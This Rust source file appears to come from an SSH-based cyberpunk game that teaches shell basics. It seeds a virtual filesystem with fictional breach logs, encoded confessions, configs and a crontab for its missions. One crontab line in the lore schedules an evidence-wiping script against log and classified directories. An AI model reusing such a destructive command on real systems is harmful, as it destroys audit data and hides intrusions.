             TX-4401 | 2026-03-05 | SOLD | sector maps (current) | 200 NC\n\
             TX-4402 | 2026-03-06 | SOLD | Ghost Rail routing tables | 15,000 NC\n\
             TX-4403 | 2026-03-06 | SOLD | personnel directory | 500 NC\n\
             TX-4404 | 2026-03-07 | SOLD | vault-sat-9 schematics | 8,000 NC\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/lore/lumen-transactions-reach.log",
            "LUMEN BROKERAGE — REACH ACCOUNT\n\
             TX-7701 | 2026-03-05 | SOLD | sector maps (current) | 200 NC\n\
             TX-7702 | 2026-03-06 | SOLD | Ghost Rail routing tables | 15,000 NC\n\
             TX-7703 | 2026-03-07 | SOLD | transit encryption keys | 12,000 NC\n\
             TX-7704 | 2026-03-07 | SOLD | vault-sat-9 schematics | 8,000 NC\n",
            false,
            "system",
        );

        // crucible-map mission
        let _ = vfs.write_file(
            "/",
            "/logs/crucible-netmap-fragments.txt",
            "MAP FRAGMENT 1 | corp-sim-01 -> neon-bazaar-gw [NORMAL]\n\
             MAP FRAGMENT 2 | neon-bazaar-gw -> ghost-rail [SEVERED]\n\
             MAP FRAGMENT 3 | ghost-rail -> vault-sat-9 [SEVERED]\n\
             MAP FRAGMENT 4 | vault-sat-9 -> 10.77.5.1 [STAGING]\n\
             MAP FRAGMENT 5 | 10.77.5.1 -> 203.0.113.42 [EXFIL TO REACH]\n\
             MAP FRAGMENT 6 | argon-terminal -> backup-archive [REDIRECT TO /dev/null]\n\
             MAP FRAGMENT 7 | ferro-terminal -> /data/classified [LOCKDOWN ACTIVE]\n\
             MAP FRAGMENT 8 | crucible -> maintenance-layer [HIDDEN, ACTIVE]\n",
            false,
            "system",
        );

        // wren-reply mission (ROT13 encoded)
        // Decoded: "You thought it was over. It is not.
        // Ghost Rail's blackout was a distraction. While everyone watched
        // the relays go dark, the real extraction happened in Crystal Array.
        // Vault-sat-9 was the decoy. The data I took was valuable, yes.
        // But the data they do not know I copied — that changes everything.
        // If you want the truth, look where nobody is looking."
        let _ = vfs.write_file(
            "/",
            "/data/classified/wren-reply.enc",
            "Lbh gubhtug vg jnf bire. Vg vf abg.\n\
             Tubfg Envy'f oynpxbhg jnf n distraction. Juvyr rirelbar jngpurq\n\
             gur erynlf tb qnex, gur erny rkgenpgvba unccrarq va Pelfgny Neenl.\n\
             Inhyg-fng-9 jnf gur qrpbl. Gur qngn V gbbx jnf inyhoyr, lrf.\n\
             Ohg gur qngn gurl qb abg xabj V pbcvrq — gung punatrf rirelguvat.\n\
             Vs lbh jnag gur gehgu, ybbx jurer abobql vf ybbxvat.\n\n\
             — J\n",
            false,
            "system",
        );

        // ── Story arc VFS files ──────────────────────────────────────────────────

        // first-clue mission: changelog with unauthorized entry
        let _ = vfs.write_file(
            "/",
            "/data/reports/changelog.txt",
            "SYSTEM CHANGELOG // vault-sat-9\n\
             2026-03-05 14:22 [signed:deploy] Updated relay firmware to v4.1.2\n\
             2026-03-06 09:10 [signed:admin]  Rotated backup encryption keys\n\
             2026-03-06 11:45 [signed:admin]  Applied security patch CVE-2026-0117\n\
             2026-03-07 02:33 [unsigned:???]  unauthorized config change: ssh_host_key replaced\n\
             2026-03-07 03:00 [signed:cron]   Scheduled health check — FAILED (node unreachable)\n\
             2026-03-07 08:00 [signed:ops]    Incident declared: Ghost Rail blackout\n",
            false,
            "system",
        );

        // deleted-file mission: classified directory with hidden memo
        let _ = vfs.mkdir_p("/", "data/classified", "system");
        let _ = vfs.write_file(
            "/",
            "/data/classified/.memo",
            "INTERNAL MEMO // CLASSIFICATION: RESTRICTED\n\
             FROM: Executive Board, CorpSim Operations\n\
             TO: Security Director\n\
             RE: Anomalous access — user 'wren'\n\n\
             We are aware that terminated employee WREN retains active badge credentials.\n\
             The board has decided NOT to revoke access at this time.\n\
             Rationale: monitoring wren's activity may reveal the full scope of the breach.\n\
             We knew about the unauthorized access two weeks before the blackout.\n\
             EVIDENCE-CORPSIM: Board chose to monitor rather than prevent.\n\n\
             This memo is classified. Do not distribute.\n\
             If this information reaches external auditors, invoke Protocol 7.\n",
            false,
            "system",
        );

        // access-pattern mission: detailed vault-sat-9 access log
        let _ = vfs.write_file(
            "/",
            "/var/log/access-detail.log",
            "2026-03-07 21:50:01 vault-sat-9 READ  user=deploy src=10.77.3.8\n\
             2026-03-07 21:51:12 vault-sat-9 READ  user=wren   src=10.77.0.15\n\
             2026-03-07 21:51:44 vault-sat-9 WRITE user=wren   src=10.77.0.15\n\
             2026-03-07 21:52:03 vault-sat-9 READ  user=wren   src=10.77.0.15\n\
             2026-03-07 21:52:15 vault-sat-9 READ  user=neo    src=10.77.1.2\n\
             2026-03-07 21:53:01 vault-sat-9 WRITE user=wren   src=10.77.0.15\n\
             2026-03-07 21:53:22 vault-sat-9 READ  user=wren   src=10.77.0.15\n\
             2026-03-07 21:54:00 vault-sat-9 BULK  user=wren   src=10.77.0.15\n\
             2026-03-07 21:54:33 vault-sat-9 READ  user=rift   src=10.77.3.7\n\
             2026-03-07 21:55:01 vault-sat-9 BULK  user=wren   src=10.77.0.15\n\
             2026-03-07 21:55:44 vault-sat-9 WRITE user=wren   src=10.77.0.15\n\
             2026-03-07 21:56:02 vault-sat-9 READ  user=wren   src=10.77.0.15\n\
             2026-03-07 21:57:00 vault-sat-9 DISCONNECT         src=10.77.0.15\n",
            false,
            "system",
        );

        // purged-comms mission: recovered message fragments
        let _ = vfs.mkdir_p("/", "data/comms", "system");
        let _ = vfs.write_file(
            "/",
            "/data/comms/recovered-fragment.txt",
            "[RECOVERED FROM PURGED ARCHIVE — PARTIAL]\n\n\
             2026-03-07 01:14 WREN -> ???: the package is ready. rotation trigger \
             set for 02:30 UTC.\n\
             2026-03-07 01:22 WREN -> ???: confirm receipt channel is open. \
             use the GLASS-AXON-13 signal as handshake.\n\
             2026-03-07 02:28 WREN -> ???: two minutes. after this, vault-sat-9 \
             goes dark and we have a 15-minute extraction window.\n\
             2026-03-07 02:45 WREN -> ???: transfer complete. killing my session now. \
             see you on the other side.\n\n\
             [END OF RECOVERED FRAGMENTS]\n",
            false,
            "system",
        );

        // key-rotation mission: crypto event log
        let _ = vfs.write_file(
            "/",
            "/logs/crypto-events.log",
            "2026-03-07 02:29:58 SIGNAL GLASS-AXON-13 received on relay-7\n\
             2026-03-07 02:30:00 ROTATE vault-sat-9 ssh_host_key initiated by signal GLASS-AXON-13\n\
             2026-03-07 02:30:01 ROTATE vault-sat-9 ssh_host_key old_fp=SHA256:abc123 new_fp=SHA256:xyz789\n\
             2026-03-07 02:30:02 REVOKE vault-sat-9 all existing sessions terminated\n\
             2026-03-07 02:30:05 ACCEPT vault-sat-9 new session user=wren key_fp=SHA256:xyz789\n\
             2026-03-07 02:30:10 SIGNAL GLASS-AXON-13 acknowledged — rotate complete\n\
             EVIDENCE-CRYPTO: GLASS-AXON-13 triggered automated key rotation on vault-sat-9\n",
            false,
            "system",
        );

        // roster-check mission: personnel CSV
        let _ = vfs.write_file(
            "/",
            "/data/personnel.csv",
            "name,role,badge_status,department,hire_date\n\
             neo,operator,active,field-ops,2025-06-01\n\
             rift,analyst,active,intelligence,2025-08-15\n\
             shadow,courier,active,logistics,2025-09-22\n\
             ghost,technician,revoked,maintenance,2025-03-10\n\
             wren,engineer,active,infrastructure,2024-11-03\n\
             anon,intern,expired,training,2026-01-15\n\
             cipher,architect,active,engineering,2025-07-20\n",
            false,
            "system",
        );

        // timing-attack mission: paired timestamp files
        let _ = vfs.write_file(
            "/",
            "/tmp/axon-times.txt",
            "22:01:03\n22:01:17\n22:01:22\n22:02:44\n22:03:01\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/tmp/vault-drops.txt",
            "22:01:05\n22:01:18\n22:01:22\n22:02:45\n22:03:01\n",
            false,
            "system",
        );

        // exfil-trace mission: netflow log with transfer events
        let _ = vfs.write_file(
            "/",
            "/logs/netflow.log",
            "2026-03-07 02:30:12 TRANSFER internal 10.77.0.15 -> 10.77.5.1 bytes=1024 vault-sat-9\n\
             2026-03-07 02:30:45 TRANSFER external 10.77.0.15 -> 203.0.113.42 bytes=847000 routing-tables\n\
             2026-03-07 02:31:02 TRANSFER external 10.77.0.15 -> 203.0.113.42 bytes=1230000 transit-keys\n\
             2026-03-07 02:31:30 TRANSFER internal 10.77.1.2 -> 10.77.5.1 bytes=512 healthcheck\n\
             2026-03-07 02:32:00 TRANSFER external 10.77.0.15 -> 203.0.113.42 bytes=2100000 credential-dump\n\
             2026-03-07 02:33:15 TRANSFER internal 10.77.3.7 -> 10.77.5.1 bytes=256 status-ping\n\
             2026-03-07 02:34:00 DISCONNECT 10.77.0.15 session-terminated\n",
            false,
            "system",
        );

        // reach-intercept mission: intercepted comms
        let _ = vfs.mkdir_p("/", "data/intercepts", "system");
        let _ = vfs.write_file(
            "/",
            "/data/intercepts/comms-dump.txt",
            "[INTERCEPTED TRAFFIC — DECRYPTED FRAGMENTS]\n\n\
             2026-03-06 23:00 ORIGIN=unknown DEST=relay-external-7\n\
             \"The Reach confirms payment for Ghost Rail routing tables.\"\n\
             \"[REDACTED] will handle extraction. Window is 02:30-02:45 UTC.\"\n\n\
             2026-03-07 02:44 ORIGIN=10.77.0.15 DEST=203.0.113.42\n\
             \"Package delivered. The Reach now has full transit authority.\"\n\
             \"[REDACTED] credits transferred to offshore account.\"\n\n\
             EVIDENCE-REACH: The Reach paid for Ghost Rail routing data via intermediary\n\n\
             [END INTERCEPT]\n",
            false,
            "system",
        );

        // config-diff mission: before/after vault configs
        let _ = vfs.write_file(
            "/",
            "/data/configs/vault-before.conf",
            "# vault-sat-9 configuration // last clean audit 2026-03-05\n\
             hostname=vault-sat-9\n\
             sector=secure\n\
             ssh_port=22\n\
             ssh_host_key_fingerprint=SHA256:abc123def456ghi789\n\
             auth_mode=publickey\n\
             max_sessions=8\n\
             backup_schedule=daily\n\
             encryption=aes-256-gcm\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/configs/vault-after.conf",
            "# vault-sat-9 configuration // post-incident snapshot 2026-03-07\n\
             hostname=vault-sat-9\n\
             sector=secure\n\
             ssh_port=22\n\
             ssh_host_key_fingerprint=SHA256:xyz789uvw456rst123\n\
             auth_mode=publickey\n\
             max_sessions=8\n\
             backup_schedule=disabled\n\
             encryption=aes-256-gcm\n",
            false,
            "system",
        );

        // dead-drop mission: hidden .wren files scattered across VFS
        let _ = vfs.write_file(
            "/",
            "/data/classified/.wren-note",
            "If you found this, you are closer than they want you to be.\n\
             The signal was never a malfunction. Look at the crypto log.\n\
             — W\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/tmp/.wren-cache",
            "Extraction timestamps cached here in case the main logs get wiped.\n\
             02:30:00 — key rotation triggered\n\
             02:30:45 — first external transfer\n\
             02:34:00 — session terminated\n\
             — W\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/home/player/.wren-drop",
            "You were not supposed to find this.\n\
             But since you did: CorpSim let it happen. Check the classified memo.\n\
             The board knew. They always knew.\n\
             — W\n",
            false,
            "player",
        );

        // network-map mission: netflow summary TSV
        let _ = vfs.write_file(
            "/",
            "/data/netflow-summary.tsv",
            "source\tdestination\ttype\n\
             10.77.0.15 (wren)\tvault-sat-9\tinternal-access\n\
             vault-sat-9\t10.77.5.1 (relay)\tdata-stage\n\
             10.77.5.1 (relay)\t203.0.113.42 (Reach)\texternal-exfil\n\
             10.77.1.2 (neo)\tvault-sat-9\tnormal-ops\n\
             10.77.3.7 (rift)\tvault-sat-9\tnormal-ops\n",
            false,
            "system",
        );

        // kill-switch mission: full crontab with wren's kill switch
        let _ = vfs.write_file(
            "/",
            "/data/crontab-full.txt",
            "# MIN HOUR DOM MON DOW USER COMMAND\n\
             0 0 * * * root /opt/scripts/daily-backup.sh\n\
             30 1 * * * root /opt/scripts/log-rotate.sh\n\
             0 3 * * * root /opt/scripts/sweep-sector.sh --mode=deep\n\
             15 6 * * 1 root /opt/scripts/weekly-audit.sh\n\
             */5 * * * * root /opt/scripts/heartbeat.sh\n\
             0 12 * * * root /opt/scripts/noon-report.sh\n\
             0 4 8 3 * wren /opt/scripts/wipe-evidence.sh --target=/logs,/data/classified --confirm\n\
             0 3 * * 5 root /opt/scripts/friday-sweep.sh --full\n",
            false,
            "system",
        );

        // decrypt-wren mission: ROT13-encoded confession
        // Decoded text: "This is my confession. I am wren. I sold Ghost Rail's routing
        // tables to The Reach for enough credits to disappear. CorpSim knew and let it
        // happen because they wanted the insurance payout more than they wanted the data.
        // Everyone is guilty. This confession is my insurance policy."
        let _ = vfs.write_file(
            "/",
            "/data/classified/wren-final.enc",
            "Guvf vf zl pbafrffvba. V nz jera.\n\
             V fbyq Tubfg Envy'f ebhgvat gnoyr gb Gur Ernpu\n\
             sbe rabhtu perqvgf gb qvfnccrne.\n\
             CorpSim xarj naq yrg vg unccra orpnhfr gurl\n\
             jnagrq gur vafhenapr cnlbhg zber guna gurl\n\
             jnagrq gur qngn.\n\
             Rirelbar vf thvygl.\n\
             Guvf confession vf zl vafhenapr cbyvpl.\n",
            false,
            "system",
        );

        // incident-report mission: additional time-stamped events
        let _ = vfs.write_file(
            "/",
            "/var/log/incident.log",
            "2026-03-07 21:55:00 [auth] ACCEPT user=deploy src=10.0.3.8\n2026-03-07 21:57:22 [auth] REJECT user=probe src=10.0.7.11\n2026-03-07 21:58:01 [access] DENY path=/vault/unlock src=10.0.9.44\n2026-03-07 21:59:15 [access] ALLOW path=/api/health src=10.0.3.8\n2026-03-07 22:00:00 [event] CRITICAL vault-sat-9 unreachable\n2026-03-07 22:00:30 [auth] REJECT user=root src=10.0.9.44\n2026-03-07 22:01:01 [event] ERROR ghost-rail cascade failure\n",
            false,
            "system",
        );

        let cwd = "/home/player".to_owned();
        let node = "corp-sim-01".to_owned();
        let mut env = HashMap::new();
        env.insert("USER".to_owned(), prompt_user.to_owned());
        env.insert("HOME".to_owned(), "/home/player".to_owned());
        env.insert("PWD".to_owned(), cwd.clone());
        env.insert("PATH".to_owned(), "/bin:/usr/bin".to_owned());
        env.insert("?".to_owned(), "0".to_owned());

        Self {
            vfs,
            cwd,
            user: prompt_user.to_owned(),
            node,
            env,
            last_exit: 0,
            history: Vec::new(),
            command_log: HashMap::new(),
        }
    }

    fn prompt(&self) -> String {
        format!("{}@{}:{}$ ", self.user, self.node, self.cwd)
    }

    fn execute_shell(&mut self, engine: &ShellEngine, line: &str) -> Result<shell::CommandResult> {
        let mut ctx = ExecutionContext {
            vfs: &mut self.vfs,
            cwd: self.cwd.clone(),
            user: self.user.clone(),
            node: self.node.clone(),
            env: self.env.clone(),
            last_exit: self.last_exit,
        };

        let result = engine.execute(&mut ctx, line)?;
        self.cwd = ctx.cwd;
        self.env = ctx.env;
        self.last_exit = result.exit_code;
        Ok(result)
    }
}

#[derive(Clone)]
struct GameServer {
    app: Arc<AppState>,
}

struct GameSession {
    app: Arc<AppState>,
    peer_addr: Option<SocketAddr>,
    username: String,
    offered_fingerprints: Vec<String>,
    player_id: Option<Uuid>,
    profile: Option<PlayerProfile>,
    shell_state: Option<ShellState>,
    mode: Mode,
    flash_enabled: bool,
    line_buffer: Vec<u8>,
    pending_keyvault: bool,
    pending_admin_passphrase: bool,
    current_duel: Option<Uuid>,
    current_npc_duel: Option<Uuid>,
    redline_until: Option<Instant>,
    script_cooldown_until: Option<Instant>,
    command_window: VecDeque<Instant>,
    supports_ansi: bool,
    supports_unicode: bool,
    pending_lf_after_cr: bool,
    escape_sequence_remaining: u8,
    pty_columns: u32,
}

impl GameSession {
    fn new(app: Arc<AppState>, peer_addr: Option<SocketAddr>) -> Self {
        Self {
            app,
            peer_addr,
            username: "guest".to_owned(),
            offered_fingerprints: Vec::new(),
            player_id: None,
            profile: None,
            shell_state: None,
            mode: Mode::Training,
            flash_enabled: true,
            line_buffer: Vec::new(),
            pending_keyvault: false,
            pending_admin_passphrase: false,
            current_duel: None,
            current_npc_duel: None,
            redline_until: None,
            script_cooldown_until: None,
            command_window: VecDeque::new(),
            supports_ansi: true,
            supports_unicode: true,
            pending_lf_after_cr: false,
            escape_sequence_remaining: 0,
            pty_columns: 80,
        }
    }

    async fn initialize_identity(&mut self) -> Result<()> {
        let remote_ip = self
            .peer_addr
            .map(|ip| ip.ip().to_string())
            .unwrap_or_else(|| "0.0.0.0".to_owned());
        let profile = self
            .app
            .world
            .login(&self.username, &remote_ip, &self.offered_fingerprints)
            .await?;

        self.player_id = Some(profile.id);
        self.mode = Mode::Training;
        self.flash_enabled = self.app.cfg.ui.flash_default;
        self.shell_state = Some(ShellState::bootstrap(&sanitize_prompt_user(
            &profile.username,
        )));
        self.profile = Some(profile.clone());

        if let Some(secret) = &self.app.admin_secret {
            if self
                .app
                .world
                .is_super_admin_candidate(&profile.username, &remote_ip, secret)
                .await
                && secret.auto_keygen_on_first_login
                && profile.registered_key_fingerprints.is_empty()
            {
                self.pending_admin_passphrase = true;
            }
        }

        Ok(())
    }

    fn enforce_rate_limit(&mut self) -> bool {
        let now = Instant::now();
        while self
            .command_window
            .front()
            .is_some_and(|t| now.duration_since(*t) > Duration::from_secs(1))
        {
            self.command_window.pop_front();
        }

        if self.command_window.len() >= self.app.cfg.server.burst as usize {
            return false;
        }

        self.command_window.push_back(now);
        true
    }

    async fn run_line(&mut self, line: &str) -> Result<(String, i32, bool)> {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            return Ok((String::new(), 0, false));
        }
        if trimmed == "exit" || trimmed == "logout" {
            return Ok(("Session closed.\n".to_owned(), 0, true));
        }

        if let Some(player_id) = self.player_id {
            if let Some(profile) = self.app.world.get_player(player_id).await {
                if profile.banned {
                    return Ok(("Account zeroed. Session terminated.\n".to_owned(), 1, true));
                }
            }
        }

        if self.pending_admin_passphrase {
            self.pending_admin_passphrase = false;
            let (pub_line, private_blob) = generate_admin_keypair(trimmed)?;
            if let Some(pid) = self.player_id {
                let _ = self.app.world.register_key(pid, &pub_line).await;
            }
            return Ok((
                format!(
                    "Admin bootstrap key generated (one-time reveal).\nStore this encrypted private key offline:\n{}\nPublic key registered: {}\n",
                    private_blob, pub_line
                ),
                0,
                false,
            ));
        }

        if self.pending_keyvault {
            self.pending_keyvault = false;
            if let Some(pid) = self.player_id {
                match self.app.world.register_key(pid, trimmed).await {
                    Ok(fp) => {
                        return Ok((
                            format!(
                                "Key registered. Fingerprint {}\nTraining access + multiplayer trust path improved.\n",
                                fp
                            ),
                            0,
                            false,
                        ));
                    }
                    Err(err) => {
                        return Ok((format!("Key registration failed: {err}\n"), 1, false));
                    }
                }
            }
        }

        if !self.enforce_rate_limit() {
            return Ok((
                "Rate limit exceeded. Slow down to avoid defensive lockouts.\n".to_owned(),
                1,
                false,
            ));
        }

        if let Some(until) = self.redline_until {
            if Instant::now() > until {
                self.mode = Mode::Training;
                self.redline_until = None;
                if let Some(pid) = self.player_id {
                    let _ = self
                        .app
                        .world
                        .mode_switch(pid, Mode::Training, Some(self.flash_enabled))
                        .await;
                }
                return Ok((
                    "REDLINE timer expired. Returning to Training Sim.\n".to_owned(),
                    0,
                    false,
                ));
            }
        }

        let cmd = trimmed.split_whitespace().next().unwrap_or_default();
        if is_game_command(cmd) {
            return self.run_game_command(trimmed).await;
        }
        if let Some(reason) = escape_attempt_reason(trimmed) {
            if let Some(player_id) = self.player_id {
                let _ = self
                    .app
                    .world
                    .ban_forever(player_id, reason, "auto-warden")
                    .await;
            }
            return Ok((
                format!(
                    "INTRUSION DETECTED: {reason}\nAccount zeroed permanently. Connection terminated.\n"
                ),
                126,
                true,
            ));
        }

        let (res, parsed) = {
            let shell = self
                .shell_state
                .as_mut()
                .ok_or_else(|| anyhow!("session shell unavailable"))?;
            let parsed = self.app.shell.parse(trimmed, &shell.env).ok();
            let res = shell.execute_shell(&self.app.shell, trimmed)?;
            // Record command history and output for mission validation
            shell.history.push(trimmed.to_owned());
            if shell.history.len() > 500 {
                shell.history.remove(0);
            }
            if res.exit_code == 0 && !res.stdout.is_empty() {
                shell
                    .command_log
                    .insert(trimmed.to_owned(), res.stdout.clone());
            }
            // Write history to VFS so the `history` builtin can read it
            let hist_content = shell
                .history
                .iter()
                .enumerate()
                .map(|(i, cmd)| format!("  {}  {}", i + 1, cmd))
                .collect::<Vec<_>>()
                .join("\n");
            let _ = shell
                .vfs
                .write_file("/", "/tmp/.history", &hist_content, false, "system");
            (res, parsed)
        };

        let mut combined = String::new();
        if !res.stdout.is_empty() {
            combined.push_str(&res.stdout);
            if !combined.ends_with('\n') {
                combined.push('\n');
            }
        }
        if !res.stderr.is_empty() {
            combined.push_str(&res.stderr);
            if !combined.ends_with('\n') {
                combined.push('\n');
            }
        }

        if res.exit_code == 0 {
            if let Some((pipeline_depth, unique_tools)) = parsed.as_ref().and_then(style_metrics) {
                if let Some(player_id) = self.player_id {
                    let reward = self
                        .app
                        .world
                        .style_bonus(player_id, pipeline_depth, unique_tools)
                        .await?;
                    if reward > 0 {
                        combined.push_str(&format!(
                            "[style bonus] +{reward} Neon Chips (chain={pipeline_depth}, tools={unique_tools})\n"
                        ));
                    }
                }
            }
        }

        Ok((combined, res.exit_code, false))
    }

    async fn run_game_command(&mut self, line: &str) -> Result<(String, i32, bool)> {
        let mut parts = line.split_whitespace();
        let cmd = parts.next().unwrap_or_default();
        let args = parts.collect::<Vec<_>>();
        let player_id = self.player_id.ok_or_else(|| anyhow!("no player id"))?;

        match cmd {
            "help" => {
                let theme = Theme::for_mode(self.mode.clone());
                let mut out = self.render_section_banner("COMMAND MATRIX");
                out.push_str(&format!(
                    "{}Quickstart{} tutorial start -> briefing -> missions -> gate -> mode netcity\n",
                    theme.accent, RESET
                ));
                out.push('\n');
                out.push_str("Core      help guide briefing tutorial missions accept submit mode gate keyvault status events leaderboard daily tier\n");
                out.push_str("Intel     dossier [callsign] | mail [inbox|read N|count]\n");
                out.push_str("Social    chat party mail\n");
                out.push_str("Economy   inventory shop auction\n");
                out.push_str("Scripts   scripts market | scripts run <name>\n");
                out.push_str(
                    "PvP       pvp roster | pvp challenge <username> | pvp attack|defend|script\n",
                );
                out.push('\n');
                out.push_str("Rules\n");
                out.push_str("  - Hardcore: 3 deaths = ZEROED (account locked)\n");
                out.push_str("  - Host escape/probing attempts = PERMA-ZERO + disconnect\n");
                out.push('\n');
                out.push_str("New to the shell? Run: tutorial start (guided walkthrough)\n");
                out.push_str("Need step-by-step onboarding? Run: guide\n");
                out.push_str("Need bash fundamentals? Run: guide shell\n");
                out.push_str("Need story + mission hints? Run: briefing [mission-code]\n");
                Ok((out, 0, false))
            }
            "guide" => {
                if args.is_empty() || args.first() == Some(&"quick") {
                    return Ok((self.quickstart_guide(), 0, false));
                }
                if matches!(args.first(), Some(&"shell") | Some(&"bash")) {
                    return Ok((self.shell_survival_guide(), 0, false));
                }
                if args.first() == Some(&"full") {
                    return Ok((self.full_gameplay_guide(), 0, false));
                }
                Ok(("Usage: guide [quick|full|shell]\n".to_owned(), 1, false))
            }
            "briefing" => {
                if args.is_empty() {
                    return Ok((self.story_briefing(), 0, false));
                }

                let code = args[0];
                let detail = self
                    .app
                    .world
                    .mission_detail_for_player(player_id, code)
                    .await?;
                Ok((self.render_mission_briefing(&detail), 0, false))
            }
            "gate" => {
                let gate = self
                    .app
                    .world
                    .netcity_gate_reason(player_id, &self.offered_fingerprints)
                    .await?;
                let out = if let Some(reason) = gate {
                    let mut msg = self.render_section_banner("NETCITY GATE // LOCKED");
                    msg.push_str(&key_value_line(self.mode.clone(), "Reason", &reason));
                    msg.push('\n');
                    msg.push_str("Unlock checklist\n");
                    msg.push_str("  [ ] keyvault register\n");
                    msg.push_str("  [ ] submit keys-vault\n");
                    msg.push_str(
                        "  [ ] submit one starter mission (pipes-101|finder|redirect-lab|log-hunt|dedupe-city)\n",
                    );
                    msg.push_str("  [ ] reconnect with registered SSH key\n");
                    msg
                } else {
                    let mut msg = self.render_section_banner("NETCITY GATE // UNLOCKED");
                    msg.push_str("Use: mode netcity\n");
                    msg
                };
                Ok((out, 0, false))
            }
            "leaderboard" => {
                let requested = args
                    .first()
                    .and_then(|raw| raw.parse::<usize>().ok())
                    .unwrap_or(10);
                let entries = self.app.world.leaderboard_snapshot(requested).await;
                let mut out = self.render_section_banner("LEADERBOARD");
                out.push_str("RANK  PLAYER                    REP   WALLET   ACH\n");
                for (idx, entry) in entries.iter().enumerate() {
                    let rank = idx + 1;
                    let rank_label = if rank <= 9 {
                        format!("0{rank}")
                    } else {
                        rank.to_string()
                    };
                    out.push_str(&format!(
                        "{:<5} {:<25} {:<5} {:<8} {}\n",
                        rank_label,
                        entry.display_name,
                        entry.reputation,
                        entry.wallet,
                        entry.achievements
                    ));
                }
                Ok((out, 0, false))
            }
            "tutorial" => {
                let step = self.app.world.get_tutorial_step(player_id).await?;
                match args.first().copied() {
                    Some("start") => {
                        let target = if step == 0 { 1 } else { step.min(6) };
                        self.app.world.set_tutorial_step(player_id, target).await?;
                        Ok((
                            render_tutorial_step(
                                target,
                                &self.render_section_banner("INTERACTIVE TUTORIAL"),
                            ),
                            0,
                            false,
                        ))
                    }
                    Some("next") => {
                        if step == 0 {
                            return Ok(("Run `tutorial start` first.\n".to_owned(), 1, false));
                        }
                        if step >= 7 {
                            return Ok((
                                "Tutorial complete! Run `missions` to see the mission board.\n"
                                    .to_owned(),
                                0,
                                false,
                            ));
                        }
                        // Validate the current step was completed via command_log
                        let log = self.shell_state.as_ref().map(|s| &s.command_log);
                        if validate_tutorial_step(step, log) {
                            let next = step + 1;
                            self.app.world.set_tutorial_step(player_id, next).await?;
                            if next > 6 {
                                let mut out = self.render_section_banner("TUTORIAL COMPLETE");
                                out.push_str("All six steps done. You now know: pwd, ls, cat, grep, pipes, and redirection.\n\n");
                                out.push_str("Next steps:\n");
                                out.push_str("  missions          # see the full mission board\n");
                                out.push_str("  accept nav-101    # try the tutorial-track missions for 5 rep each\n");
                                out.push_str(
                                    "  briefing          # read the story and get mission hints\n",
                                );
                                out.push_str("  accept keys-vault # required to unlock NetCity\n");
                                Ok((out, 0, false))
                            } else {
                                Ok((
                                    render_tutorial_step(
                                        next,
                                        &self.render_section_banner("INTERACTIVE TUTORIAL"),
                                    ),
                                    0,
                                    false,
                                ))
                            }
                        } else {
                            let mut out = String::new();
                            out.push_str(&format!("Step {} not yet completed. Run the suggested command first, then come back with `tutorial next`.\n\n", step));
                            out.push_str(&render_tutorial_step(step, ""));
                            Ok((out, 1, false))
                        }
                    }
                    Some("reset") => {
                        self.app.world.set_tutorial_step(player_id, 1).await?;
                        Ok((
                            render_tutorial_step(1, &self.render_section_banner("TUTORIAL RESET")),
                            0,
                            false,
                        ))
                    }
                    Some(n) if n.parse::<u8>().is_ok() => {
                        let target = n.parse::<u8>().unwrap();
                        if !(1..=6).contains(&target) {
                            return Ok((
                                "Tutorial has steps 1-6. Usage: tutorial <1-6>\n".to_owned(),
                                1,
                                false,
                            ));
                        }
                        self.app.world.set_tutorial_step(player_id, target).await?;
                        Ok((
                            render_tutorial_step(
                                target,
                                &self.render_section_banner("INTERACTIVE TUTORIAL"),
                            ),
                            0,
                            false,
                        ))
                    }
                    None => {
                        // Show current status
                        if step == 0 {
                            Ok((
                                "Tutorial not started. Run `tutorial start` to begin.\n".to_owned(),
                                0,
                                false,
                            ))
                        } else if step >= 7 {
                            Ok((
                                "Tutorial complete! Run `missions` to see the mission board.\n"
                                    .to_owned(),
                                0,
                                false,
                            ))
                        } else {
                            let mut out = format!("Tutorial progress: step {}/6\n\n", step);
                            out.push_str(&render_tutorial_step(step, ""));
                            Ok((out, 0, false))
                        }
                    }
                    _ => Ok((
                        "Usage: tutorial [start|next|reset|1-6]\n".to_owned(),
                        1,
                        false,
                    )),
                }
            }
            "missions" => {
                let missions = self.app.world.mission_statuses(player_id).await?;
                let mut out = self.render_section_banner("MISSION BOARD");
                out.push_str("CODE             STATE      PROG                 TRACK      TITLE\n");
                for m in missions {
                    let badge = mission_state_badge(self.mode.clone(), &m.state);
                    let meter = progress_meter(self.mode.clone(), m.progress, 12);
                    let track = mission_track_label(&m.code, m.required, m.starter);
                    out.push_str(&format!(
                        "{:<16} {:<10} {:>3}% {} {:<10} {}\n",
                        m.code,
                        badge,
                        m.progress.min(100),
                        meter,
                        track,
                        m.title
                    ));
                    out.push_str(&format!("  Brief: {}\n", m.summary));
                    out.push_str(&format!("  Try  : {}\n", m.suggested_command));
                }
                out.push_str("\nUse `briefing <mission-code>` for deeper story and shell hints.\n");
                Ok((out, 0, false))
            }
            "accept" => {
                let Some(code) = args.first() else {
                    return Ok(("Usage: accept <mission-code>\n".to_owned(), 1, false));
                };
                self.app.world.accept_mission(player_id, code).await?;
                Ok((format!("Mission accepted: {code}\n"), 0, false))
            }
            "submit" => {
                let Some(code) = args.first() else {
                    return Ok(("Usage: submit <mission-code>\n".to_owned(), 1, false));
                };
                // Validate mission completion by checking command output log
                if let Some(shell) = &self.shell_state {
                    if let Err(e) = self
                        .app
                        .world
                        .validate_mission(code, &shell.command_log)
                        .await
                    {
                        return Ok((format!("{e}\n"), 1, false));
                    }
                }
                self.app.world.complete_mission(player_id, code).await?;
                let mut out = format!("Mission completed: {code}\n");
                if *code == "keys-vault" {
                    out.push_str(
                        "KEYS VAULT complete. Finish one starter mission for NetCity unlock.\n",
                    );
                }
                if self.app.world.is_hidden_mission_code(code) {
                    out.push_str("Secret relay unlocked. Use: relay <message>\n");
                }
                Ok((out, 0, false))
            }
            "inventory" => Ok((
                "Inventory: [script.gremlin.grep x1], [focus_boost x2]\n".to_owned(),
                0,
                false,
            )),
            "shop" => {
                if args.first() == Some(&"list") {
                    Ok((
